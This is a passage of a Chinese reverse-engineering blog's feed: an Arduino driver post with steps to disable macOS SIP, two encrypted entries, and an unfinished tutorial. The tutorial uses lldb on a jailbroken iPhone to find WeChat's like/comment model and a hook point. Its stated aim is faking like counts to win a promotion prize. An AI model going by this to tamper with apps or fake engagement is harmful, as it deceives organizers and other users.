href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="上手实践"><a href="#上手实践" class="headerlink" title="上手实践"></a>上手实践</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>待续…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>可以看到调用栈的符号已经恢复了，能够清晰的看出调用的过程</p><p>其中里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 